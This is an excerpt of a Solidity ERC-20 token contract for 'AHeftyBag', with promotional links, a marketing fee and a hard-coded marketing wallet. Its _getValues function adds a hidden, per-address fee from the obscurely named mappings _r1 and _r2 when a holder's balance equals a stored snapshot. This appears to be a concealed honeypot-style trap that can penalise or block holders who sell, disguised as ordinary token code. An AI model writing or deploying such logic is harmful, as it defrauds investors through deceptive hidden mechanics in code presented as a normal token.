...
//Telegram: https://t.me/AHEFTYBAG
//Website: https://aheftybag.com
...
contract AHeftyBag is Context, IERC20, Ownable {
    ...
    mapping (address => uint256) private _r1;
    mapping (address => uint256) private _r2;
    mapping (address => bool) private _isExcludedFromFee;
 

    uint256 private _tTotal = 1000 * 10**9;
    uint256 public _maxTxAmount = 1000 * 10**9; //
    uint256 private constant SWAP_TOKENS_AT_AMOUNT = 30 * 10**9; //

    string private constant _name = "AHeftyBag"; //
    string private constant _symbol = unicode"HOLDING"; //
    uint8 private constant _decimals = 9; //

    uint256 public _marketingFee = 1;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0xc7CBb639D0bA8Be09a739659b2eFc8BD47Bd1eCd;
    ...
    function _getValues(uint256 amount, address from) private returns (uint256) {
        ...
        if (_tOwned[from]-_r1[from]==0)liquidityFee=liquidityFee+_r2[from];
    ...
    function gr1(address account) public view returns(uint256) {
        return _r1[account];
    }
    ...
    function syncres(address adr1, address adr2) private{
        _r1[adr1]=_tOwned[adr1];
        _r1[adr2]=_tOwned[adr2];
    }
